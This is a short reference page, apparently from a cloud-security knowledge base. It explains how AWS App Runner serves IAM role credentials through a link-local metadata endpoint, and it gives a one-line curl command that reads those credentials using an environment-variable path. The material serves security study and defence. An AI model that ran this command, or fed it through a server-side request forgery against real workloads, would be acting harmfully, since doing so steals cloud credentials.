# AWS App Runner

AWS App Runner is an AWS service that allows you to easily run containers without managing the underlying infrastructure.

| Property      | Value                          |
| ----------- | ------------------------------------ |
| Credentials delivery mechanism       | [Served through link-local metadata service](../types-of-credentials-delivery.md#served-through-link-local-metadata-service)  |
| Protection type       | URL path requires value from environment |
| Exploitation primitives    | `Query arbitrary URL` and `Read environment variables` |


## Extracting credentials

App Runner is based on [Amazon ECS](./ecs.md). The metadata service is available at `169.254.170.2`, and the URL path to query is in the environment variable `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

```bash
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

## References

- https://docs.aws.amazon.com/apprunner/latest/dg/security_iam_service-with-iam.html#security_iam_service-with-iam-roles:~:text=if%20you%20like.-,Instance%20role,-The%20instance%20role
- https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77